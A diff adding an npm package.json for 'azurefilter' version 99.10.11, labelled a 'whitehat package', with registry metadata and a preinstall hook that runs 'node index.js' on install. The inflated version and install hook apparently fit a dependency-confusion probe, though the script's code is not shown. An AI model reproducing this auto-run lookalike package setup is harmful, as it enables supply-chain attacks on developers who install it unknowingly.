@@ -1,0 +1,39 @@
+{
+    "name": "azurefilter",
+    "version": "99.10.11",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azurefilter@99.10.11",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-XxC3HHvsqFqJ8IwOzpOE7K7gx8aqJBAuuaG1TFEmOqSNkzVWqkaYeBDYE8khd7PR9+oQ+p60qMlIZ3x2AxRdtg==",
+        "shasum": "d60c9a7cd2bf6f10608df4f660f0810feed3ffff",
+        "tarball": "https://registry.npmjs.org/azurefilter/-/azurefilter-99.10.11.tgz",
+        "fileCount": 2,
+        "unpackedSize": 4929,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiJP1DACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmr+eg/+JFxTE8m5oLI2ldQ81i/nwK88+2S6Qzxat9xOKUID895LBSfb\r\naBJFbrwofPy+VGR49fnfg0iZKYPhzGmREiYhESI2MBH6Q3KWdvDH2llLcV5g\r\nFoqP+JgQH/mzpUoKCeH7ScpP35Z7m2Wofc5nc9awnFPSCsKEj7m0O141KzC5\r\ntq7gLpY6rAA8+oNuFcjSYF3m63HUhVfnhX9qTEjqK4sJGPRjqYwSkemF4kT8\r\n1hYybDkRY1gqhApWCvhjpCwj5NqIJtvI+8xjMVgo3WSFHEsupOMd1CGYzNNm\r\nQn1K6HFb4triyv4gK7kDBED+ApGN65wSn9YGiWtQVYNnaOkp+fkaOxC/z+A4\r\nrATQvntNHlUon84EMSwrPKrCbR2EU04ogCvFiKTGMcwSSe7kNjK5DqyxNfts\r\nMJSr+P7/8XKavHxiBM9nj/a4nlKf3CHyIcGwc0g0Vl0YsfVYJWibMSDkobds\r\nmrjIQZMUjZ/WhUGwp2oN9wnDDjior+BNQJBxmq3W5vEC2xLy4d9ekT1EMmAY\r\nvFAxfeyo0yURMyZTMj92FagSwehLvVWLHJBa3cDqbZ1ExKPaHsUIVNp5v4Rt\r\nZbLbEHVgQ2v9L11H4Npn7UetQQb0Rk4RsBHQAUBIZvcj2NlJ+EBy0/G7CnZl\r\nAW1I6FHQGdRWAV31St1y+u/P9MOey4sw3gE=\r\n=fgVz\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azurefilter",
+        "email": "azurefilter@rt11.33mail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azurefilter",
+            "email": "azurefilter@rt11.33mail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azurefilter_99.10.11_1646591299195_0.28355364640176073"
+    },
+    "_hasShrinkwrap": false
+}
